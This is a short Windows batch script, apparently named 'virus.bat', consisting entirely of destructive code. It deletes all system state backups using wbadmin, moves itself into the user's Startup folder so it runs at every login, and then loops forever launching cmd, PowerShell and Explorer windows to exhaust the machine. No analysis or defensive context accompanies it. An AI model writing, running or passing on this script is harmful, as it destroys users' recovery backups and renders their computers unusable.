@echo off
wbadmin delete systemstatebackup -keepVersions:0
echo %USERNAME%
move "C:\Users\%USERNAME%\Downloads\virus.bat" "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
:a
start cmd
start powershell
start explorer
goto a
